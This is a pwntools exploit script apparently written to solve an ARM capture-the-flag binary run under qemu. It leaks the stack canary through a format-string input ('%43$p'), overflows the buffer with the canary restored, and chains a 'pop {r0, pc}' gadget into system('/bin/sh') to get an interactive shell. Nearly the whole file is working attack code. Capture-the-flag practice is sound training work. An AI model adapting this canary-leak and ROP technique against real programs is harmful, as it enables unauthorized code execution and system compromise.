#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was a modification of the original template via:
# $ pwn template
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        io = process(["./qemu-arm-static", "-g", "1234", exe])
        gdb.attach(target=("localhost", 1234), exe=exe, gdbscript=gdbscript)
        return io
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process(["./qemu-arm-static", exe], *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *vuln+64
'''.format(**locals())

# Set up pwntools for the correct files
exe = './chall'
elf = context.binary = ELF(exe)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

io.recvline_contains(b"Tell me something:")
io.sendline(b"%43$p")

canary = int(io.recvline(False), 16)
print(f"canary: {hex(canary)}")

io.recvline()

io.sendline(flat(
    b"A" * 100,
    canary,
    b"AAAA",
    0x0006f25c,  # pop {r0, pc}
    next(elf.search(b"/bin/sh")),
    elf.symbols["system"]
))


io.interactive()
